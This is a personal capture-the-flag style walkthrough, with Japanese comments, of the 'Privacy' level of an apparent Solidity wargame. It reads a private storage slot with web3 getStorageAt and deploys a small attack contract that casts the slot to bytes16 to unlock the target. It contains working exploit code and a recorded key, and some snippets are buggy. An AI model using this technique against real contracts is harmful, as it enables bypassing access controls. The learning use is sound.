12 Privacy 

The creator of this contract was careful enough to protect the sensitive areas of its storage.

Unlock this contract to beat the level.

Things that might help:

- Understanding how storage works

- Understanding how parameter parsing works

- Understanding how casting works

Tips:

Remember that metamask is just a commodity. Use another tool if it is presenting problems. 
Advanced gameplay could involve using remix, or your own web3 provider.
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Privacy {

  bool public locked = true; //01 :[0]
  uint256 public ID = block.timestamp;//5f669cb3 :[1]
  uint8 private flattening = 10; //10 is 0a :[2] called flattenning
  uint8 private denomination = 255; //255 is ff :[2]
  uint16 private awkwardness = uint16(block.timestamps); //9cb3 :[2] data representation current timestamp coerced to 16bits 
  bytes32[3] private data; //we have three things init of Data Array [3],[4],[5]
//eight bits in one byte 




  constructor(bytes32[3] memory _data) public {
    data = _data;
  }
  
  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2])); //this mean [5]! this secret key that we need to get in order to unlock this contract 
    locked = false;
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}
```

```
>contract.address
'0x1FE73dC35aFc4c0FfCB515858Da6F13439D9647a'
```
```
>contract.abi
(4) [{…}, {…}, {…}, {…}]
0: {inputs: Array(1), stateMutability: 'nonpayable', type: 'constructor', constant: undefined, payable: undefined}
1: {inputs: Array(0), name: 'ID', outputs: Array(1), stateMutability: 'view', type: 'function', …}
2: {inputs: Array(0), name: 'locked', outputs: Array(1), stateMutability: 'view', type: 'function', …}
3: {inputs: Array(1), name: 'unlock', outputs: Array(0), stateMutability: 'nonpayable', type: 'function', …}
length: 4
[[Prototype]]: Array(0)
```
```
>await contract.locked()
true
```

//current contract is locked. locked is true. 


//gonna iterate for about six times
```solidity
let storage = []

let callbackFNConstructor = (index) => (error, contractData) => {
  storage[index] = ContractData
}
```


//gonna iterate for about six times cuz should be a maximum of six or less variables stored in storage 
```solidity
for(var i = 0; i < 6; i++) { //six loop iteration 
  web3.eth.getStorageAt(contract.address, i, callbackFNConstructor(i))
}
```
```
Promise {<pending>}[[Prototype]]: Promise[[PromiseState]]: "pending"[[PromiseResult]]: undefined
```

//errorでちゃった
```
VM316:4 Uncaught ReferenceError: ContractData is not defined
    at Object.callback (<anonymous>:4:20)
    at a (e4e9b69aea3571538dca60595571493ed3b7d30d.js:1:269639)
    at a (e4e9b69aea3571538dca60595571493ed3b7d30d.js:1:169902)
    at p.run (e4e9b69aea3571538dca60595571493ed3b7d30d.js:1:84233)
    at d (e4e9b69aea3571538dca60595571493ed3b7d30d.js:1:83727)
```
//eight bits in one byte 
```
10 is 0a 
255 is ff 
```
```solidity
/PrivacyAttack.sol 
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Privacy.sol";

contract PrivacyAttack {
    Privacy target;

    constructor(address _targetAddress) public {
        target = Privacy(_targetAddress);
    }

    function unlock(bytes32 _slotValue) public {
        bytes16 key = bytes16(_slotValue);
        target.unlock(key);
    }

}
```

Privacy.sol のaddressを確認
```
>contract.address
'0x1FE73dC35aFc4c0FfCB515858Da6F13439D9647a'
```

//PrivacyAttack contract をdeploy using by '0x1FE73dC35aFc4c0FfCB515858Da6F13439D9647a'
```
[block:10918283 txIndex:2]from: 0xF6e...f30F5to: PrivacyAttack.(constructor)value: 0 weidata: 0x608...9647alogs: 0hash: 0x11f...c9d3b
```

//Praivacy.solからunlock用のkeyを抜き出す
```
>await web3.eth.getStorageAt(contract.address, 5, console.log)
'0x30d5f6d82f24a04bddbb8af089e145ace7bbc57351b4878ed559b598c6182467'
```

//unlock with key '0x30d5f6d82f24a04bddbb8af089e145ace7bbc57351b4878ed559b598c6182467'
```
[block:10918324 txIndex:3]from: 0xF6e...f30F5to: PrivacyAttack.unlock(bytes32) 0x5d4...3ee47value: 0 weidata: 0xec9...82467logs: 0hash: 0x039...cc972
```
```
>await contract.locked()
false
```

Nothing in the ethereum blockchain is private. 
The keyword private is merely an artificial construct of the Solidity language. 
Web3s getStorageAt(...) can be used to read anything from storage.
 It can be tricky to read what you want though, since several optimization rules and techniques are used to compact the storage as much as possible.

It cant get much more complicated than what was exposed in this level. 
For more, check out this excellent article by "Darius": How to read Ethereum contract storage






